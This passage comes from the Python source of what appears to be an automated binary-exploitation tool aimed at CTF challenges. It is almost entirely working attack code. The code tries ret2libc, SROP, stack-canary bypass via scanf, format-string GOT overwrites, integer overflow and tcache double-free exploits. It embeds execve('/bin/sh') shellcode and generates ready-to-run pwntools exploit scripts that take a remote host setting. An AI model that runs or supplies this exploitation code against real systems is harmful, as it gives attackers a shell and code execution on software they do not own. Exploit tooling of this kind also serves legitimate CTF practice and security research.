                    io.sendline(b'echo PWNED')
                    output = io.recv(timeout=1)
                    if b'PWNED' in output:
                        io.close()
                        return True, payload2
                except Exception as e:
                    logger.debug(f"ret2libc attempt (ret={use_ret}) failed: {e}")
                    continue

            io.close()
            return False, b""

        except Exception as e:
            logger.debug(f"ret2libc execution error: {e}")
            return False, b""

    def _try_srop(self):
        """Try SROP exploitation."""
        attempt = ExploitAttempt(technique="srop", result=ExploitResult.FAILED)

        # Need syscall and way to set rax
        if 'syscall' not in self._gadgets:
            attempt.notes.append("No syscall gadget found")
            self.report.attempts.append(attempt)
            return

        if 'pop_rax' not in self._gadgets:
            attempt.notes.append("No pop rax gadget found")
            self.report.attempts.append(attempt)
            return

        # Need /bin/sh
        binsh = self._binsh_addr
        if not binsh:
            attempt.notes.append("/bin/sh not found in binary")
            self.report.attempts.append(attempt)
            return

        if not self._offset:
            attempt.notes.append("Could not determine buffer offset")
            self.report.attempts.append(attempt)
            return

        attempt.offset = self._offset
        attempt.target_addr = self._gadgets['syscall']

        # Generate SROP script (complex payload, better to generate script)
        self.report.exploit_script = self._generate_srop_script(
            self._offset,
            self._gadgets['syscall'],
            self._gadgets['pop_rax'],
            binsh
        )

        attempt.result = ExploitResult.PARTIAL
        attempt.notes.append("SROP payload generated, requires manual testing")

        self.report.attempts.append(attempt)

    def _try_scanf_canary_bypass(self):
        """Try scanf canary bypass exploitation.

        Uses the scanf skip technique: when scanf reads with %lf/%d and receives
        invalid input (like '.'), it does NOT write to the destination, allowing
        us to 'skip' over the canary without corrupting it.
        """
        attempt = ExploitAttempt(technique="scanf_canary_bypass", result=ExploitResult.FAILED)

        # Only applicable if canary is enabled
        if not self.binary.protections.canary:
            attempt.notes.append("No canary protection, bypass not needed")
            self.report.attempts.append(attempt)
            return

        # Check for scanf
        scanf_funcs = ['scanf', '__isoc99_scanf', '__isoc23_scanf', 'fscanf', 'sscanf']
        has_scanf = any(func in self.binary.plt for func in scanf_funcs)

        if not has_scanf:
            attempt.notes.append("No scanf function found")
            self.report.attempts.append(attempt)
            return

        try:
            from supwngo.vulns.canary_bypass import CanaryBypassDetector, CanaryBypassType
            from supwngo.exploit.canary_bypass import generate_scanf_bypass_script

            # Detect canary bypass opportunities
            detector = CanaryBypassDetector(self.binary)
            vulns = detector.detect()

            # Filter for scanf skip vulnerabilities
            scanf_bypasses = [
                v for v in vulns
                if v.details.get('bypass_type') == CanaryBypassType.SCANF_SKIP.name
            ]

            if not scanf_bypasses:
                attempt.notes.append("No scanf canary bypass detected")
                self.report.attempts.append(attempt)
                return

            # Get bypass details
            bypass = scanf_bypasses[0]
            canary_index = bypass.details.get('canary_index', 33)
            format_spec = bypass.details.get('format_specifier', '%lf')
            skip_char = bypass.details.get('skip_character', '.')

            attempt.notes.append(f"Canary at index {canary_index}, skip with '{skip_char}'")

            # Find target address
            target_addr = 0
            target_name = "target"

            # Check for win function first
            if self._win_func:
                target_name, target_addr = self._win_func
                attempt.notes.append(f"Target: {target_name} @ {hex(target_addr)}")
            else:
                # Try one_gadget or system
                attempt.notes.append("No win function, generating template for libc exploitation")

            # Get libc path for two-stage exploitation
            libc_path = self.libc_path
            if not libc_path:
                # Try to find system libc
                import os
                libc_paths = [
                    '/lib64/libc.so.6',  # Fedora/RHEL
                    '/lib/x86_64-linux-gnu/libc.so.6',  # Debian/Ubuntu
                    '/lib/libc.so.6',
                ]
                for path in libc_paths:
                    if os.path.exists(path):
                        libc_path = path
                        break

            # Generate exploit script
            two_stage = target_addr == 0 and libc_path is not None
            script = generate_scanf_bypass_script(
                binary=self.binary,
                canary_index=canary_index,
                target_addr=target_addr,
                target_name=target_name,
                libc_path=libc_path,
                two_stage=two_stage,
            )

            self.report.exploit_script = script
            attempt.target_addr = target_addr

            # Mark as partial success - script generated but needs testing
            attempt.result = ExploitResult.PARTIAL
            attempt.notes.append("Scanf canary bypass script generated")

            self.report.technique_used = "scanf_canary_bypass"

            # If we have a win function, try to verify it works
            if target_addr:
                success = self._test_scanf_bypass(canary_index, target_addr, skip_char)
                if success:
                    attempt.result = ExploitResult.SUCCESS
                    self.report.successful = True
                    attempt.notes.append("Exploit verified working!")

        except Exception as e:
            logger.debug(f"Scanf canary bypass detection failed: {e}")
            attempt.error = str(e)

        self.report.attempts.append(attempt)

    def _test_scanf_bypass(self, canary_index: int, target_addr: int, skip_char: str) -> bool:
        """Test if scanf canary bypass works."""
        try:
            import struct
            from pwn import process, context as pwn_context

            pwn_context.log_level = 'error'

            def addr_to_double(addr: int) -> str:
                packed = struct.pack('<Q', addr)
                double_val = struct.unpack('d', packed)[0]
                return str(double_val)

            p = process([str(self.binary.path)])

            # Try to interact with menu-based program
            # Send option to add grades
            try:
                p.sendlineafter(b'>', b'2', timeout=2)
            except Exception:
                p.close()
                return False

            # Total elements: buffer + canary (skip) + RBP + RIP
            total_elements = canary_index + 3

            # Send number of elements
            try:
                p.sendlineafter(b':', str(total_elements).encode(), timeout=2)
            except Exception:
                p.close()
                return False

            # Send values
            for i in range(total_elements):
                try:
                    p.recvuntil(b'[', timeout=1)
                except Exception:
                    break

                if i < canary_index:
                    p.sendline(b"1.0")
                elif i == canary_index:
                    p.sendline(skip_char.encode())  # Skip canary
                elif i == canary_index + 1:
                    p.sendline(addr_to_double(0x4141414141414141).encode())  # RBP
                else:
                    p.sendline(addr_to_double(target_addr).encode())  # RIP

            # Check for win indicators
            try:
                output = p.recvall(timeout=2)
                output_str = output.decode('latin-1', errors='ignore').lower()

                success_indicators = ['flag{', 'ctf{', 'you win', 'congratulations']
                for indicator in success_indicators:
                    if indicator in output_str:
                        p.close()
                        return True
            except Exception:
                pass

            p.close()
            return False

        except Exception as e:
            logger.debug(f"Scanf bypass test failed: {e}")
            return False

    def _try_format_string(self):
        """Try format string exploitation."""
        attempt = ExploitAttempt(technique="formatstring", result=ExploitResult.FAILED)

        # Check if printf is used
        has_printf = 'printf' in self.binary.plt
        if not has_printf:
            attempt.notes.append("No printf in PLT, format string unlikely")
            self.report.attempts.append(attempt)
            return

        # Look for win function or writable targets
        win_func = self._win_func

        try:
            from pwn import process, context as pwn_context, fmtstr_payload
            import re

            pwn_context.log_level = 'error'
            pwn_context.arch = 'amd64' if self.binary.bits == 64 else 'i386'
            is_64bit = self.binary.bits == 64

            # First, find the format string offset by sending a probe
            p = process([str(self.binary.path)])

            # Read all initial output (may contain leaked addresses)
            initial_output = b""
            try:
                # Try to get all initial output up to input prompt
                initial_output = p.recv(timeout=0.5)
            except:
                pass

            # Check for address leak patterns like "Secret is at: 0x..."
            # Search entire initial output
            target_addr = None
            all_addrs = re.findall(rb'0x[0-9a-fA-F]+', initial_output)
            for addr_match in all_addrs:
                addr = int(addr_match, 16)
                # Look for reasonable addresses (not 0, not too large, not just a small constant)
                if addr > 0x1000 and addr < 0x7fffffffffff:
                    target_addr = addr
                    attempt.notes.append(f"Found leaked address: {hex(target_addr)}")
                    break

            # For 64-bit, use 8 A's; for 32-bit, use 4 A's
            marker = b'AAAAAAAA' if is_64bit else b'AAAA'
            marker_hex = b'0x4141414141414141' if is_64bit else b'0x41414141'
            marker_pattern = b'4141414141414141' if is_64bit else b'41414141'

            # Find format string offset using indexed probes (more reliable)
            offset = None
            for test_offset in range(1, 30):
                p2 = process([str(self.binary.path)])
                try:
                    p2.recv(timeout=0.3)  # Consume initial output
                except:
                    pass
                probe = marker + f"%{test_offset}$p".encode()
                p2.sendline(probe)
                try:
                    out = p2.recvall(timeout=0.5)
                except:
                    out = b""
                p2.close()

                # Check if our marker appears at this offset
                if marker_hex in out or marker_pattern in out.lower():
                    offset = test_offset
                    break

            p.close()

            if offset is None:
                attempt.notes.append("Could not determine format string offset")
                self.report.attempts.append(attempt)
                return

            attempt.notes.append(f"Format string offset: {offset}")

            # If we have a target address (leaked), try to write 0x41414141 to it
            if target_addr:
                success = self._test_format_string_write(target_addr, 0x41414141, offset)
                if success:
                    attempt.result = ExploitResult.SUCCESS
                    self.report.successful = True
                    self.report.technique_used = "formatstring"
                    self.report.exploit_script = self._generate_format_string_script(
                        target_addr, 0x41414141, offset)
                    attempt.target_addr = target_addr
                    self.report.attempts.append(attempt)
                    return

            # Try overwriting GOT entry for win function
            if win_func:
                win_name, win_addr = win_func
                # Try to find a GOT entry to overwrite (e.g., exit, __stack_chk_fail)
                for func_name in ['exit', '__stack_chk_fail', 'puts', 'printf']:
                    got_addr = self.binary.got.get(func_name)
                    if got_addr:
                        attempt.notes.append(f"Trying GOT overwrite: {func_name}@{hex(got_addr)} -> {hex(win_addr)}")
                        success = self._test_format_string_write(got_addr, win_addr, offset)
                        if success:
                            attempt.result = ExploitResult.SUCCESS
                            self.report.successful = True
                            self.report.technique_used = "formatstring"
                            self.report.exploit_script = self._generate_format_string_script(
                                got_addr, win_addr, offset)
                            self.report.attempts.append(attempt)
                            return

            # If we got offset but couldn't exploit, mark as partial
            attempt.result = ExploitResult.PARTIAL
            attempt.notes.append("Format string offset found but exploitation failed")

        except Exception as e:
            attempt.notes.append(f"Format string test failed: {e}")

        self.report.attempts.append(attempt)

    def _test_format_string_write(self, target_addr: int, value: int, offset: int) -> bool:
        """Test if format string write succeeds using manual %hn writes."""
        try:
            from pwn import process, p64, p32, context as pwn_context

            pwn_context.log_level = 'error'
            is_64bit = self.binary.bits == 64
            pwn_context.arch = 'amd64' if is_64bit else 'i386'

            # Build manual format string using only %hn (2-byte writes)
            # This avoids the issue where fmtstr_payload's %lln corrupts adjacent memory
            payload = self._build_manual_fmt_payload(target_addr, value, offset, is_64bit)

            if payload is None:
                return False

            p = process([str(self.binary.path)])
            # Read any initial output
            try:
                p.recvuntil(b":", timeout=1.0)
            except:
                pass

            p.sendline(payload)

            # Check if win function was called (look for flag output)
            try:
                output = p.recvall(timeout=2.0)
                p.close()
                if b'CTF{' in output or b'flag{' in output or b'Flag:' in output:
                    return True
            except:
                pass

            p.close()
        except Exception as e:
            logger.debug(f"Format string write test failed: {e}")
        return False

    def _build_manual_fmt_payload(self, target_addr: int, value: int, offset: int, is_64bit: bool) -> bytes:
        """Build format string payload using only %hn (2-byte) writes.

        This is more reliable than fmtstr_payload which sometimes uses %lln (8-byte writes)
        that can corrupt adjacent memory.

        For 64-bit: format string + padding + addresses at end
        For 32-bit: addresses at start + format string
        """
        from pwn import p64, p32

        try:
            # For a 4-byte value like 0x41414141, write two 2-byte chunks
            low_half = value & 0xFFFF       # Lower 2 bytes
            high_half = (value >> 16) & 0xFFFF  # Upper 2 bytes

            # Addresses to write to
            addr_low = target_addr
            addr_high = target_addr + 2

            if is_64bit:
                pack = p64
                # On 64-bit, addresses go after format string, accessed as:
                # offset+0 -> first 8 bytes of our payload (the format string start)
                # offset+1 -> next 8 bytes
                # etc.
                # We need to calculate where our addresses land

                # The offset provided is where the INPUT starts on the stack
                # We need to figure out where to place addresses so they're at specific offsets

                # Simpler approach: place addresses at fixed positions and calculate
                # Use format: %Nc%X$hn%Y$hn + padding + addr1 + addr2
                # Where X and Y are the offsets to our addresses

                # Build format string to print low_half chars then write, then print more for high_half
                if low_half == high_half:
                    # Both halves are the same (like 0x41414141 -> 0x4141, 0x4141)
                    # We can write the same value to both addresses
                    # Offset points to our format string. Addresses after 24 bytes are at offset+3 and offset+4
                    addr_offset1 = offset + 3  # First address at byte 24
                    addr_offset2 = offset + 4  # Second address at byte 32

                    fmt = f"%{low_half}c%{addr_offset1}$hn%{addr_offset2}$hn".encode()
                else:
                    # Different values - need to sort and print incrementally
                    addr_offset1 = offset + 3
                    addr_offset2 = offset + 4

                    if low_half <= high_half:
                        # Print low_half first, then diff for high_half
                        diff = high_half - low_half
                        if diff > 0:
                            fmt = f"%{low_half}c%{addr_offset1}$hn%{diff}c%{addr_offset2}$hn".encode()
                        else:
                            fmt = f"%{low_half}c%{addr_offset1}$hn%{addr_offset2}$hn".encode()
                    else:
                        # Print high_half first (to addr_high), then diff for low_half
                        diff = low_half - high_half
                        if diff > 0:
                            fmt = f"%{high_half}c%{addr_offset2}$hn%{diff}c%{addr_offset1}$hn".encode()
                        else:
                            fmt = f"%{high_half}c%{addr_offset2}$hn%{addr_offset1}$hn".encode()

                # Pad to exactly 24 bytes so addresses start at offset+3
                if len(fmt) < 24:
                    fmt = fmt + b'A' * (24 - len(fmt))
                elif len(fmt) > 24:
                    # Adjust offsets if format is longer
                    target_len = ((len(fmt) + 7) // 8) * 8
                    addr_offset1 = offset + (target_len // 8)
                    addr_offset2 = addr_offset1 + 1

                    # Rebuild with new offsets
                    if low_half == high_half:
                        fmt = f"%{low_half}c%{addr_offset1}$hn%{addr_offset2}$hn".encode()
                    elif low_half <= high_half:
                        diff = high_half - low_half
                        if diff > 0:
                            fmt = f"%{low_half}c%{addr_offset1}$hn%{diff}c%{addr_offset2}$hn".encode()
                        else:
                            fmt = f"%{low_half}c%{addr_offset1}$hn%{addr_offset2}$hn".encode()
                    else:
                        diff = low_half - high_half
                        if diff > 0:
                            fmt = f"%{high_half}c%{addr_offset2}$hn%{diff}c%{addr_offset1}$hn".encode()
                        else:
                            fmt = f"%{high_half}c%{addr_offset2}$hn%{addr_offset1}$hn".encode()

                    fmt = fmt + b'A' * (target_len - len(fmt))

                payload = fmt + pack(addr_low) + pack(addr_high)
                return payload

            else:
                # 32-bit: addresses can go at the beginning
                pack = p32

                # Build with addresses first for 32-bit
                addr_bytes = pack(addr_low) + pack(addr_high)
                # Addresses take 8 bytes = 2 arguments at offset and offset+1

                if low_half == high_half:
                    # Account for 8 chars already printed (the addresses)
                    to_print = (low_half - 8) % 0x10000
                    if to_print > 0:
                        fmt = f"%{to_print}c%{offset}$hn%{offset+1}$hn".encode()
                    else:
                        fmt = f"%{offset}$hn%{offset+1}$hn".encode()
                else:
                    # Sort and build incrementally
                    printed = 8  # addresses already printed
                    if low_half <= high_half:
                        to_print1 = (low_half - printed) % 0x10000
                        to_print2 = (high_half - low_half) % 0x10000
                        if to_print1 > 0:
                            fmt = f"%{to_print1}c%{offset}$hn"
                        else:
                            fmt = f"%{offset}$hn"
                        if to_print2 > 0:
                            fmt += f"%{to_print2}c%{offset+1}$hn"
                        else:
                            fmt += f"%{offset+1}$hn"
                        fmt = fmt.encode()
                    else:
                        to_print1 = (high_half - printed) % 0x10000
                        to_print2 = (low_half - high_half) % 0x10000
                        if to_print1 > 0:
                            fmt = f"%{to_print1}c%{offset+1}$hn"
                        else:
                            fmt = f"%{offset+1}$hn"
                        if to_print2 > 0:
                            fmt += f"%{to_print2}c%{offset}$hn"
                        else:
                            fmt += f"%{offset}$hn"
                        fmt = fmt.encode()

                return addr_bytes + fmt

        except Exception as e:
            logger.debug(f"Failed to build manual fmt payload: {e}")
            return None

    def _generate_format_string_script(self, target_addr: int, value: int, offset: int) -> str:
        """Generate format string exploit script."""
        return f'''#!/usr/bin/env python3
"""
Format String Exploit for {self.binary.path.name if hasattr(self.binary.path, 'name') else str(self.binary.path)}
Generated by supwngo AutoExploit

Writes {hex(value)} to {hex(target_addr)} using format string.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Read initial output
    io.recvuntil(b":", timeout=2)

    # Format string parameters
    target = {hex(target_addr)}
    value = {hex(value)}
    offset = {offset}

    # Generate payload
    payload = fmtstr_payload(offset, {{target: value}}, numbwritten=0)
    log.info(f"Sending format string payload ({{len(payload)}} bytes)")

    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _try_integer_overflow(self):
        """Try integer overflow exploitation (two-stage input)."""
        attempt = ExploitAttempt(technique="intoverflow", result=ExploitResult.FAILED)

        # Must have win function for simple exploitation
        if not self._win_func:
            attempt.notes.append("No win function found")
            self.report.attempts.append(attempt)
            return

        # Check for scanf/read which commonly have integer overflow issues
        has_scanf = 'scanf' in self.binary.plt or '__isoc99_scanf' in self.binary.plt or '__isoc23_scanf' in self.binary.plt
        has_read = 'read' in self.binary.plt
        if not (has_scanf and has_read):
            attempt.notes.append("No scanf+read pattern found")
            self.report.attempts.append(attempt)
            return

        win_name, win_addr = self._win_func
        attempt.target_addr = win_addr

        # Try common integer overflow exploitation patterns
        # Pattern: program asks for size, then reads data
        # We provide a size that passes check but allows overflow when multiplied

        # Common overflow sizes that pass "size <= 256" or similar checks
        # but allow large reads when multiplied
        test_sizes = [256, 255, 128, 64, 32, 16]

        # Common buffer + saved rbp + ret offsets for various buffer sizes
        test_offsets = [
            # 256-byte buffers (256 + 8 + 8 = 272, 256 + 16 + 8 = 280)
            272, 280, 288,
            # 128-byte buffers
            136, 144, 152,
            # Other common sizes
            40, 56, 72, 88, 104, 120,
            168, 184, 200, 216, 232, 248, 264, 296,
        ]

        for size in test_sizes:
            for offset in test_offsets:
                if self._test_integer_overflow_exploit(size, offset, win_addr):
                    attempt.result = ExploitResult.SUCCESS
                    attempt.offset = offset
                    attempt.notes.append(f"Size {size}, offset {offset}")

                    # Build final payload
                    from pwn import p64
                    payload = f"{size}\n".encode()
                    payload += b"A" * offset
                    payload += p64(win_addr)

                    attempt.payload = payload
                    self.report.successful = True
                    self.report.technique_used = "intoverflow"
                    self.report.final_payload = payload

                    # Generate script
                    self.report.exploit_script = self._generate_intoverflow_script(
                        size, offset, win_addr, win_name
                    )

                    self.report.attempts.append(attempt)
                    return

        attempt.notes.append("Integer overflow patterns not exploitable")
        self.report.attempts.append(attempt)

    def _test_integer_overflow_exploit(self, size: int, offset: int, target_addr: int) -> bool:
        """Test if integer overflow exploit works with given parameters."""
        try:
            from pwn import p64, process, context as pwn_context
            import time

            pwn_context.log_level = 'error'  # Quiet

            # Use pwntools process for proper stdin handling
            # Two-stage input requires separate sends
            p = process([str(self.binary.path)])

            # Send size first
            p.sendline(str(size).encode())
            time.sleep(0.05)  # Small delay for scanf to process

            # Send overflow payload
            payload = b"A" * offset + p64(target_addr)
            p.sendline(payload)

            # Get output
            try:
                output = p.recvall(timeout=1.0)
                output_str = output.decode('latin-1', errors='ignore').lower()
            except Exception:
                output_str = ""
            finally:
                p.close()

            # Check for success indicators
            success_indicators = ['flag{', 'ctf{', 'htb{', 'you win', 'congratulations']
            for indicator in success_indicators:
                if indicator in output_str:
                    return True

        except Exception as e:
            logger.debug(f"Integer overflow test failed: {e}")

        return False

    def _generate_intoverflow_script(self, size: int, offset: int, win_addr: int, win_name: str) -> str:
        """Generate integer overflow exploit script."""
        return f'''#!/usr/bin/env python3
"""
Integer Overflow Exploit for {self.binary.path.name if hasattr(self.binary.path, 'name') else str(self.binary.path)}
Generated by supwngo AutoExploit

Target: {win_name} @ {hex(win_addr)}
Size: {size}
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Integer overflow: size passes check but allows large read
    size = {size}

    # Build payload
    offset = {offset}
    payload = b"A" * offset
    payload += p64({hex(win_addr)})  # {win_name}

    # Send size then payload
    io.sendline(str(size).encode())
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _try_double_free(self):
        """Try double free exploitation (menu-based heap program)."""
        attempt = ExploitAttempt(technique="doublefree", result=ExploitResult.FAILED)

        # Must have malloc and free
        has_malloc = 'malloc' in self.binary.plt
        has_free = 'free' in self.binary.plt
        if not (has_malloc and has_free):
            attempt.notes.append("No malloc/free found, double free unlikely")
            self.report.attempts.append(attempt)
            return

        # Must have win function for simple exploitation
        if not self._win_func:
            attempt.notes.append("No win function for double free target")
            self.report.attempts.append(attempt)
            return

        win_name, win_addr = self._win_func
        attempt.target_addr = win_addr

        # Check if program outputs win address (common in CTF)
        try:
            result = subprocess.run(
                [str(self.binary.path)],
                input=b"4\n",  # Try exit option
                capture_output=True,
                timeout=self.timeout,
            )
            output = result.stdout.decode('latin-1', errors='ignore')

            # Check if win address is leaked
            import re
            addr_matches = re.findall(r'0x[0-9a-fA-F]+', output)
            win_hex = hex(win_addr)
            win_leaked = any(win_hex.lower() in m.lower() for m in addr_matches)

            if win_leaked:
                attempt.notes.append(f"Win address leaked: {win_hex}")
        except Exception:
            pass

        # Try common double free tcache poisoning patterns
        if self._try_double_free_tcache(win_addr):
            attempt.result = ExploitResult.SUCCESS
            attempt.notes.append("Double free tcache poisoning worked")
            self.report.successful = True
            self.report.technique_used = "doublefree"
            self.report.attempts.append(attempt)
            return

        # Generate exploit template
        self.report.exploit_script = self._generate_double_free_template(win_addr, win_name)
        attempt.result = ExploitResult.PARTIAL
        attempt.notes.append("Double free template generated")
        self.report.attempts.append(attempt)

    def _try_double_free_tcache(self, win_addr: int) -> bool:
        """Try tcache double free poisoning."""
        try:
            from pwn import p64

            # Common menu-based heap exploitation pattern
            # 1. Alloc chunk 0
            # 2. Alloc chunk 1 (for later tcache key bypass)
            # 3. Free chunk 0
            # 4. Free chunk 1
            # 5. Free chunk 0 again (double free)
            # 6. Alloc with target address
            # 7. Alloc to get chunk at target

            # Try common menu formats
            menu_patterns = [
                # Pattern 1: numbered menu with index prompts
                {
                    'alloc': b"1\n{idx}\n{data}\n",
                    'free': b"2\n{idx}\n",
                    'exit': b"4\n",
                },
            ]

            for pattern in menu_patterns:
                payload = b""
                # Alloc 0
                payload += pattern['alloc'].format(idx=0, data=b"AAAA").replace(b"{idx}", b"0").replace(b"{data}", b"AAAA")
                # Alloc 1
                payload += pattern['alloc'].format(idx=1, data=b"BBBB").replace(b"{idx}", b"1").replace(b"{data}", b"BBBB")
                # Free 0
                payload += pattern['free'].replace(b"{idx}", b"0")
                # Free 1
                payload += pattern['free'].replace(b"{idx}", b"1")
                # Free 0 (double free)
                payload += pattern['free'].replace(b"{idx}", b"0")
                # Alloc with win address
                payload += pattern['alloc'].replace(b"{idx}", b"2").replace(b"{data}", p64(win_addr))
                # Alloc to consume
                payload += pattern['alloc'].replace(b"{idx}", b"3").replace(b"{data}", b"CCCC")
                # Alloc to get chunk at win
                payload += pattern['alloc'].replace(b"{idx}", b"4").replace(b"{data}", b"DDDD")
                # Exit
                payload += pattern['exit']

                result = subprocess.run(
                    [str(self.binary.path)],
                    input=payload,
                    capture_output=True,
                    timeout=self.timeout,
                )

                output = (result.stdout + result.stderr).decode('latin-1', errors='ignore').lower()

                if 'flag{' in output or 'ctf{' in output or 'you win' in output:
                    return True

        except Exception as e:
            logger.debug(f"Double free test failed: {e}")

        return False

    def _generate_double_free_template(self, win_addr: int, win_name: str) -> str:
        """Generate double free exploit template."""
        return f'''#!/usr/bin/env python3
"""
Double Free Exploit Template for {self.binary.path.name if hasattr(self.binary.path, 'name') else str(self.binary.path)}
Generated by supwngo AutoExploit

Target: {win_name} @ {hex(win_addr)}

This is a template - you may need to adjust the menu interaction.
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def alloc(io, idx, data):
    io.sendline(b"1")
    io.sendline(str(idx).encode())
    io.send(data)

def free(io, idx):
    io.sendline(b"2")
    io.sendline(str(idx).encode())

def edit(io, idx, data):
    io.sendline(b"3")
    io.sendline(str(idx).encode())
    io.send(data)

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    win_addr = {hex(win_addr)}  # {win_name}

    # Tcache double free exploitation
    # Adjust chunk size and indices based on program behavior

    # Allocate two chunks
    alloc(io, 0, b"A" * 8)
    alloc(io, 1, b"B" * 8)

    # Free chunk 0
    free(io, 0)

    # Free chunk 1 (needed for tcache key bypass on newer glibc)
    free(io, 1)

    # Double free chunk 0
    free(io, 0)

    # Now tcache for this size: 0 -> 1 -> 0
    # Allocate and write target address
    alloc(io, 2, p64(win_addr))

    # Consume the duplicate
    alloc(io, 3, b"C" * 8)

    # This allocation should return our target address
    # Writing to it may trigger win or we need to call it
    alloc(io, 4, p64(win_addr))

    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _test_exploit(self, payload: bytes, expect_shell: bool = False) -> bool:
        """Test if exploit payload works."""
        try:
            # First run without exploit to get baseline output
            baseline_result = subprocess.run(
                [str(self.binary.path)],
                input=b"test\n",
                capture_output=True,
                timeout=self.timeout,
            )
            baseline_output = baseline_result.stdout + baseline_result.stderr
            baseline_str = baseline_output.decode('latin-1', errors='ignore').lower()
            baseline_len = len(baseline_output)

            # Now run with exploit payload
            result = subprocess.run(
                [str(self.binary.path)],
                input=payload,
                capture_output=True,
                timeout=self.timeout,
            )

            # Check output for success indicators
            output = result.stdout + result.stderr
            output_str = output.decode('latin-1', errors='ignore').lower()

            # Success indicators - things that should ONLY appear if exploit worked
            success_indicators = [
                'flag{', 'ctf{', 'htb{', 'picoctf{',
                'you win', 'congratulations',
            ]

            for indicator in success_indicators:
                # Only count as success if indicator wasn't in baseline
                if indicator in output_str and indicator not in baseline_str:
                    return True

            # Check for crash followed by different output (win function called)
            # A successful ret2win typically changes the output significantly
            if result.returncode != 0:
                # Program crashed - but did it call win first?
                for indicator in success_indicators:
                    if indicator in output_str:
                        return True

            # Check for significant output difference (win function printed something new)
            if len(output) > baseline_len + 20:
                # Something extra was printed - check for win indicators
                extra_output = output_str[baseline_len:] if len(output_str) > baseline_len else ""
                for indicator in ['win', 'flag', 'success', 'ctf']:
                    if indicator in extra_output:
                        return True

        except subprocess.TimeoutExpired:
            # Timeout might indicate we got a shell
            if expect_shell:
                return True
        except Exception as e:
            logger.debug(f"Exploit test failed: {e}")

        return False

    def _get_shellcode(self) -> bytes:
        """Get appropriate shellcode for architecture."""
        if self.binary.bits == 64:
            # execve("/bin/sh", 0, 0) for x86_64
            return (
                b"\x48\x31\xf6"              # xor rsi, rsi
                b"\x56"                      # push rsi
                b"\x48\xbf\x2f\x62\x69\x6e"  # movabs rdi, 0x68732f6e69622f
                b"\x2f\x2f\x73\x68"
                b"\x57"                      # push rdi
                b"\x54"                      # push rsp
                b"\x5f"                      # pop rdi
                b"\x48\x31\xd2"              # xor rdx, rdx
                b"\xb0\x3b"                  # mov al, 59
                b"\x0f\x05"                  # syscall
            )
        else:
            # execve("/bin/sh", 0, 0) for x86
            return (
                b"\x31\xc0"                  # xor eax, eax
                b"\x50"                      # push eax
                b"\x68\x2f\x2f\x73\x68"      # push "//sh"
                b"\x68\x2f\x62\x69\x6e"      # push "/bin"
                b"\x89\xe3"                  # mov ebx, esp
                b"\x50"                      # push eax
                b"\x53"                      # push ebx
                b"\x89\xe1"                  # mov ecx, esp
                b"\x31\xd2"                  # xor edx, edx
                b"\xb0\x0b"                  # mov al, 11
                b"\xcd\x80"                  # int 0x80
            )

    def _p64(self, addr: int) -> bytes:
        """Pack 64-bit address."""
        return addr.to_bytes(8, 'little')

    def _p32(self, addr: int) -> bytes:
        """Pack 32-bit address."""
        return addr.to_bytes(4, 'little')

    # === Script Generation ===

    def _generate_ret2win_script(self, offset: int, win_addr: int, win_name: str) -> str:
        """Generate ret2win exploit script."""
        ret_gadget = self._gadgets.get('ret', 0)

        return f'''#!/usr/bin/env python3
"""
ret2win Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

Target: {win_name} @ {hex(win_addr)}
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Addresses
    win_addr = {hex(win_addr)}  # {win_name}
    ret_gadget = {hex(ret_gadget) if ret_gadget else "None  # Find a ret gadget if needed"}

    # Build payload
    offset = {offset}
    payload = b"A" * offset

    # Stack alignment (64-bit needs 16-byte alignment before call)
    {"payload += p64(ret_gadget)  # ret for alignment" if self.binary.bits == 64 and ret_gadget else "# No alignment needed (32-bit or no ret gadget)"}

    # Return to win function
    payload += {"p64" if self.binary.bits == 64 else "p32"}(win_addr)

    log.info(f"Payload length: {{len(payload)}}")
    log.info(f"Sending payload...")

    io.sendline(payload)

    # Get output
    io.interactive()

if __name__ == "__main__":
    exploit()
'''

    def _generate_shellcode_script(self, offset: int, shellcode: bytes) -> str:
        """Generate shellcode injection exploit script."""
        return f'''#!/usr/bin/env python3
"""
Shellcode Injection Exploit for {self.binary.path.name}
Generated by supwngo AutoExploit

NX is disabled - direct shellcode execution possible
Offset: {offset}
"""

from pwn import *

# Configuration
BINARY = "{self.binary.path}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"

def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Shellcode - execve("/bin/sh", 0, 0)
    shellcode = {repr(shellcode)}

    # Offset to return address
    offset = {offset}

    # TODO: You need to find the buffer address
    # Options:
    # 1. Leak stack address
    # 2. Use jmp esp/rsp gadget
    # 3. Known fixed address (no ASLR/PIE)

    buffer_addr = 0x0  # <-- SET THIS

    # Build payload
    nop_sled = b"\\x90" * 32  # NOP sled
    payload = nop_sled + shellcode
    payload = payload.ljust(offset, b"A")
    payload += {"p64" if self.binary.bits == 64 else "p32"}(buffer_addr + len(nop_sled)//2)

    log.info(f"Shellcode length: {{len(shellcode)}}")
    log.info(f"Payload length: {{len(payload)}}")

    io.sendline(payload)
    io.interactive()

